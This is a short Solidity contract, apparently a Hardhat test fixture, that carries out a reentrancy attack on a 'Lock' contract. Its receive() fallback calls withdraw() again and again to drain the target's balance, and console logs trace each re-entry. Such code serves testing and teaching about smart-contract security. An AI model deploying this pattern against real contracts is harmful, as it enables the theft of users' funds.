// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "hardhat/console.sol";

interface ILock {
    function withdraw() external;
}

contract MaliciousReentrant {
    ILock public lockContract;

    constructor(address _lockAddress) payable {
        lockContract = ILock(_lockAddress);
    }

    function attack() public payable {
        console.log("MaliciousReentrant: attack called");
        lockContract.withdraw();
    }

    receive() external payable {
        console.log("MaliciousReentrant: receive called, lockContract balance: %o", address(lockContract).balance);
        console.log("MaliciousReentrant: re-entering withdraw");
        lockContract.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}